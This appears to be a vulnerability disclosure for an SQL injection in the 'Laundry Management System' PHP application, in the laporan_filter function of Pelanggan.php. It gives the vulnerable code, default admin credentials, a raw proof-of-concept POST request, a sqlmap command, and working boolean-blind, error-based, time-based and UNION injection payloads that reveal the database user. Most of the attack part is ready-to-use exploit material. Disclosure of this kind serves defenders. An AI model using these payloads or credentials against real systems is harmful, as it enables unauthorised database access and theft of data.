Laundry Management System SQL Injection on (/application/controller/Pelanggan.php) 

Vendor Homepage:

```
https://www.sourcecodester.com/php-ci-laundry-management-system-source-code
```

Version: 

```
V1.0
```

Tested on: 

```
PHP, Apache, MySQL
```

Crudentials:

```
admin
admin123
```

Affected Page:

```
/application/controller/Pelanggan.php
```

The potential injection point is located within the `laporan_filter` function, where the `$jeniskelamin` variable's value is directly embedded into the SQL query without the  use of parameterized queries or proper data sanitization, leading to a  risk of SQL injection.

```
	public function laporan_filter()
	{
		$user['username'] = $this->session->userdata('username');
		
		$jeniskelamin = $this->input->post('jeniskelamin');

		if ($jeniskelamin == "Semua") {
			$data['data_pelanggan'] = $this->data_pelanggan->get_data()->result();
		} else {
			$data['data_pelanggan'] = $this->db->query("select * from pelanggan where jeniskelamin = '$jeniskelamin'")->result();
		}
```

Proof of vulnerability:

Request:

```
POST /ci_laundry/pelanggan/laporan_filter HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 17
Origin: http://localhost
Sec-GPC: 1
Connection: close
Referer: http://localhost/ci_laundry/pelanggan/laporan
Cookie: PHPSESSID=n3ilei2mg7mov24l4ol9itjc14; ci_session=8u304rgjn04iv4m3mrloksfrovf11plm
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

jeniskelamin=Male*
```

```
python3 sqlmap.py -r 1.txt --current-user --batch --dbms mysql
```

```
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: jeniskelamin=Male' RLIKE (SELECT (CASE WHEN (6788=6788) THEN 0x4d616c65 ELSE 0x28 END))-- qmeJ

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: jeniskelamin=Male' AND GTID_SUBSET(CONCAT(0x71786a6a71,(SELECT (ELT(4612=4612,1))),0x71786b7071),4612)-- cRzp

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: jeniskelamin=Male' AND (SELECT 7239 FROM (SELECT(SLEEP(5)))BzRj)-- iafZ

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: jeniskelamin=Male' UNION ALL SELECT NULL,NULL,CONCAT(0x71786a6a71,0x7a6673447a4a734b50674b47634454784873584471754171734a63757667685170794e7a594b6c47,0x71786b7071),NULL,NULL,NULL#
---
[15:21:39] [INFO] testing MySQL
[15:21:39] [WARNING] reflective value(s) found and filtering out
[15:21:39] [INFO] confirming MySQL
[15:21:40] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.33, Apache 2.4.54
back-end DBMS: MySQL >= 5.0.0
[15:21:40] [INFO] fetching current user
current user: 'root@localhost'
```

